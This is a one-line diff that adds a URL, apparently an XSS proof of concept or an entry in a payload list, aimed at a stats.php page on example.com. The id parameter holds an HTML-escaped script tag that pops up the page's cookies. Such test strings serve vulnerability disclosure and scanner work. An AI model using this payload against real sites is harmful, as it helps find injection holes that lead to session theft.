@@ -1,0 +1,1 @@
+http://www.example.com/topsite/stats.php?id=1&lt;script&gt;alert(document.cookie)&lt;/script&gt;
